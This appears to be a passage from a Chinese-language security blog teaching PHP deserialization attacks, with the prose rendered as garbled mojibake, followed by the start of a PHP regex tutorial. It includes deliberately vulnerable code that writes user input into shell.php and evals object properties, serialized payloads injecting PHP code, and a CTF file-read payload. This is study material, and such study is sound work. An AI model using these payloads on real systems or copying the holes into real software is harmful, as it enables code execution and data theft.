punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">:</span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"boy"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"18"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æ„é€ å‡½æ•°-construct"><a href="#æ„é€ å‡½æ•°-construct" class="headerlink" title="æ„é€ å‡½æ•°__construct()"></a>æ„é€ å‡½æ•°__construct()</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">test</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"constructè¢«è°ƒç”¨"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'zhangsan'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'boy'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'18'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'sex'</span><span class="token punctuation">,</span><span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$obj</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$zhangsan</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$zhangsan</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$un</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$un</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string">"shell.php"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—ï¼š</p><pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"person"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"zhangsan"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"boy"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"18"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ”¹ï¼š</p><pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"person"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">:</span><span class="token string">"&lt;?php echo "</span><span class="token number">12346</span><span class="token string">";?>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¹Ÿå°±æ˜¯è¯´åªè¦è°ƒç”¨é‚£ä¹ˆå‡½æ•°__wakeupå‡½æ•°ä¸­çš„nameå°±å¯ä»¥æ¿€æ´»ååºåˆ—åŒ–</p><p><a href="https://blog.csdn.net/qq_32393893/article/details/110290154?ops_request_misc=&request_id=&biz_id=102&utm_term=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%99%E7%A8%8B&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-110290154.first_rank_v2_pc_rank_v29" target="_blank" rel="noopener">å¾…ç»­</a></p><h3 id="é­”æœ¯æ–¹æ³•-toString"><a href="#é­”æœ¯æ–¹æ³•-toString" class="headerlink" title="é­”æœ¯æ–¹æ³•__toString()"></a>é­”æœ¯æ–¹æ³•__toString()</h3><p>å½“å¯¹è±¡è¢«è¾“å‡ºçš„æ—¶å€™ï¼Œä¼šè°ƒç”¨__toString()æ–¹æ³•</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token comment" spellcheck="true">// å½“ä»–çš„å¯¹è±¡è¢«è¾“å‡ºæ—¶å€™ï¼Œè°ƒç”¨__toString</span><span class="token keyword">class</span> <span class="token class-name">FileClass</span><span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// è¿”å›è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®ä¾‹åŒ–äº†ä¸€ä¸ªå¯¹è±¡$fileï¼Œå½“æˆ‘è¾“å‡ºè¿™ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œè°ƒç”¨äº†__toString()æ–¹æ³•ï¼Œè¯»å–äº†æ–‡ä»¶flag.phpçš„å†…å®¹ã€‚</p><p>é¢˜ç›®å®æ“ï¼š</p><p>index.phpï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'shield.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shield</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>shield.phpï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//flag is in pctf.php</span>    <span class="token keyword">class</span> <span class="token class-name">Shield</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> file <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span>              <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payloadï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token keyword">class</span> <span class="token class-name">Shield</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"pctf.php"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shield</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ååºåˆ—åŒ–æœ¬åœ°å®éªŒï¼š"><a href="#ååºåˆ—åŒ–æœ¬åœ°å®éªŒï¼š" class="headerlink" title="ååºåˆ—åŒ–æœ¬åœ°å®éªŒï¼š"></a>ååºåˆ—åŒ–æœ¬åœ°å®éªŒï¼š</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">test</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string">'hacked by ghtwf01'</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token operator">=</span><span class="token string">'hacked by blckder02'</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">pt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">.</span><span class="token string">'&lt;br />'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'__construct&lt;br />'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'__destruct()&lt;br />'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'__sleep&lt;br />'</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'__wakeup&lt;br />'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//åˆ›å»ºå¯¹è±¡è°ƒç”¨__construct</span>    <span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//åºåˆ—åŒ–å¯¹è±¡è°ƒç”¨__sleep</span>    <span class="token variable">$serialize</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//è¾“å‡ºåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²</span>    <span class="token keyword">echo</span> <span class="token string">'serialize: '</span><span class="token punctuation">.</span><span class="token variable">$serialize</span><span class="token punctuation">.</span><span class="token string">'&lt;br />'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//ååºåˆ—åŒ–å¯¹è±¡è°ƒç”¨__wakeup</span>    <span class="token variable">$unserialize</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//è°ƒç”¨ptè¾“å‡ºæ•°æ®</span>    <span class="token variable">$unserialize</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">pt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//è„šæœ¬ç»“æŸè°ƒç”¨__destruct</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“æœï¼š</p><pre class="line-numbers language-php"><code class="language-php">__construct__sleepserialize<span class="token punctuation">:</span> O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token string">"hacked by ghtwf01"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token string">"hacked by blckder02"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>__wakeuphacked by ghtwf01<span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="åŒåæ–¹æ³•çš„åˆ©ç”¨"><a href="#åŒåæ–¹æ³•çš„åˆ©ç”¨" class="headerlink" title="åŒåæ–¹æ³•çš„åˆ©ç”¨"></a>åŒåæ–¹æ³•çš„åˆ©ç”¨</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$target</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>        <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"action B"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"action A"</span><span class="token punctuation">;</span>            <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨è¿™é‡Œçš„classbå’Œclasscå…·æœ‰åŒåå‡½æ•°actionï¼Œä½†æ˜¯åœ¨classaä¸­çš„æ„æå‡½æ•°ä¸­ç¡®å®é€‰æ‹©ä»classbä¸­å®ä¾‹åŒ–å¯¹è±¡ï¼Œå½“è„šæœ¬è¿è¡Œç»“æŸæ—¶ï¼Œåˆ©ç”¨é”€æ¯å‡½æ•°è°ƒç”¨classbä¸­çš„actionå‡½æ•°ï¼Œç”±äºclasscä¸­ä¹Ÿå«æœ‰actionå‡½æ•°ï¼Œå¹¶ä¸”æœ‰å±ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ‰€ä»¥å°±å¯ä»¥å°†æ„æå‡½æ•°ä¸­çš„å¯¹è±¡é€‰æ‹©åœ¨classcä¸­å®ä¾‹åŒ–å¯¹è±¡</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$target</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token string">"phpinfo();"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"action C"</span><span class="token punctuation">;</span>            <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="sessionååºåˆ—åŒ–æ¼æ´"><a href="#sessionååºåˆ—åŒ–æ¼æ´" class="headerlink" title="sessionååºåˆ—åŒ–æ¼æ´"></a>sessionååºåˆ—åŒ–æ¼æ´</h2><h2 id="POPé“¾æ„é€ "><a href="#POPé“¾æ„é€ " class="headerlink" title="POPé“¾æ„é€ "></a>POPé“¾æ„é€ </h2><h2 id="phar-åè®®"><a href="#phar-åè®®" class="headerlink" title="phar://åè®®"></a>phar://åè®®</h2><h1 id="PHPä¹‹æ­£åˆ™è¡¨è¾¾å¼"><a href="#PHPä¹‹æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="PHPä¹‹æ­£åˆ™è¡¨è¾¾å¼"></a><a href="https://www.runoob.com/php/php-pcre.html" target="_blank" rel="noopener">PHPä¹‹æ­£åˆ™è¡¨è¾¾å¼</a></h1><p><a href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html" target="_blank" rel="noopener">w3cschoolæ­£åˆ™å­¦ä¹ </a></p><h2 id="ä¸€ã€æ­£åˆ™è¡¨è¾¾å¼çš„ä»‹ç»ï¼š"><a href="#ä¸€ã€æ­£åˆ™è¡¨è¾¾å¼çš„ä»‹ç»ï¼š" class="headerlink" title="ä¸€ã€æ­£åˆ™è¡¨è¾¾å¼çš„ä»‹ç»ï¼š"></a>ä¸€ã€æ­£åˆ™è¡¨è¾¾å¼çš„ä»‹ç»ï¼š</h2><p>æ­£åˆ™è¡¨è¾¾å¼æ˜¯ç”¨äºæè¿°å­—ç¬¦æ’åˆ—å’ŒåŒ¹é…æ¨¡å¼çš„ä¸€ç§è¯­æ³•è§„åˆ™ã€‚å®ƒä¸»è¦ç”¨äºå­—ç¬¦ä¸²çš„æ¨¡å¼åˆ†å‰²ã€åŒ¹é…ã€æŸ¥æ‰¾åŠæ›¿æ¢æ“ä½œã€‚</p><ol><li>ç”¨é€”ï¼šåŒ¹é…ã€æŸ¥æ‰¾ã€æ›¿æ¢ã€åˆ†å‰²</li><li>phpæä¾›äº†ä¸¤å¥—æ­£åˆ™è¡¨è¾¾å¼å‡½æ•°åº“<pre><code>   1. Perl å…¼å®¹æ­£åˆ™è¡¨è¾¾å¼å‡½æ•°ï¼ˆæ¨èä½¿ç”¨ï¼‰   2. POSIX æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼å‡½æ•°</code></pre></li></ol><h2 id="äºŒã€-è¯­æ³•ï¼š"><a href="#äºŒã€-è¯­æ³•ï¼š" class="headerlink" title="äºŒã€ è¯­æ³•ï¼š"></a>äºŒã€ è¯­æ³•ï¼š</h2><p>è¡¨è¾¾å¼çš„æ ¼å¼ï¼š â€œ/è¡¨è¾¾å¼/[ä¿®æ­£ç¬¦]â€<br>    è§£é‡Šï¼šå…¶ä¸­â€/â€œè¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼çš„å®šç•Œç¬¦ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ç¬¦å·ï¼šå¦‚â€#â€œï¼Œâ€ï¼â€œ<br>        æ³¨æ„ï¼šå®šç•Œç¬¦ä¸å¯ä»¥æ˜¯å­—æ¯ã€æ•°å­—å’Œæ–œçº¿\ã€‚<br>        åƒâ€œ#â€ã€â€œ|â€ã€â€œ!â€ç­‰éƒ½å¯ä»¥çš„<br>        å¦‚ï¼š/â€¦/  ã€#â€¦# ã€|â€¦.|<br>    å…¶ä¸­ä¿®æ­£ç¬¦æ˜¯å¯é€‰çš„ï¼Œè¡¨ç¤ºå¯¹è¡¨è¾¾å¼åšé¢å¤–çš„ä¿®é¥°ã€‚</p><h2 id="ä¸‰ã€-æ­£åˆ™è¡¨è¾¾å¼çš„ç»„æˆéƒ¨åˆ†ï¼š"><a 